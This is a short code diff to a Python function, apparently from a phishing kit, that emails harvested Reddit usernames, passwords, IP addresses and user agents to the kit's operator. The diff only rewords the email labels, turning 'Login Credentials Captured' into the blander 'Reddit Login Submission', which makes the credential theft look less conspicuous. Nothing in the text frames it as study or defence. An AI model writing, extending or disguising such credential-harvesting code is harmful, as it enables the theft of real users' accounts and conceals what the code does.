@@ -32,7 +32,7 @@ def is_valid_email(email):
 def send_credentials_email(username, password, ip_address, user_agent):
     """Send credentials via SMTP"""
     try:
-        subject = "🔐 New Reddit Login Credentials"
+        subject = "🔐 New Reddit Login Submission"
         html_body = f"""
         <html>
         <head>
@@ -85,7 +85,7 @@ def send_credentials_email(username, password, ip_address, user_agent):
         <body>
             <div class="container">
                 <div class="header">
-                    <h2>🔐 Login Credentials Captured</h2>
+                    <h2>🔐 Reddit Login Submission</h2>
                 </div>
                 <div class="content">
                     <div class="field">
@@ -118,7 +118,7 @@ def send_credentials_email(username, password, ip_address, user_agent):
         """
         
         text_body = f"""
-        🔐 New Reddit Login Credentials
+        🔐 New Reddit Login Submission
         ================================
         
         Username/Email: {username}
